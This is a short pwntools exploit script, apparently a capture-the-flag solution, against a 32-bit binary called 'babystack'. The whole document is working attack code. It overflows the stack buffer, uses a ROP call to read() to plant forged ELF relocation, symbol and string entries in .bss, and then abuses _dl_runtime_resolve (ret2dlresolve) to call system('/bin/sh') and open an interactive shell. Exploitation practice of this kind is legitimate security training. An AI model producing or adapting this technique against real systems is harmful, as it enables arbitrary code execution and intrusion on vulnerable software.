from pwn import *

p = process('./babystack')
elf = ELF('babystack')

bss = 0x804a020
dynsym = 0x80481cc
dynstr = 0x804822c
rel_plt = 0x80482b0

read_func = 0x804843b
resolver = 0x80482f0

payload2_size = 43

#overflow and jump bss
payload1 = b"A" * 44 #overflow and controll PIE
payload1 += p32(elf.symbols["read"]) #int read(int handle, void *buf, unsigned n);
payload1 += p32(read_func)
payload1 += p32(0)
payload1 += p32(bss)
payload1 += p32(payload2_size)
p.send(payload1)

#payload2 rop chain will write in .bss section

#calc any offsets
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (int(dynsym_offset) << 8) | 0x7
dynstr_offset = (bss + 28) - dynstr

binsh_bss_address = bss + 35
ret_plt_offset = bss - rel_plt

#ELF32_Rel
payload2 = p32(elf.got['alarm']) #r_offset
payload2 += p32(r_info)
payload2 += p32(0xdeafbeef) #padding

#ELF32_Sym
payload2 += p32(dynstr_offset)
payload2 += p32(0xdeadbeef)
payload2 += p32(0xcafebabe)
payload2 += p32(0xcafebeef)

#.dynstr
payload2 += b"system\x00"
payload2 += b"/bin/sh\x00"

p.send(payload2)


#execute _dl_runtime_resolve func
payload3 = b"A" * 44
payload3 += p32(resolver) #execute _dl_runtime_resolve func
payload3 += p32(ret_plt_offset) #set fake Structs
payload3 += p32(0xdeafbeef) #padding
payload3 += p32(binsh_bss_address)

#--stack--
#system
#bin/sh

p.send(payload3)
p.interactive()

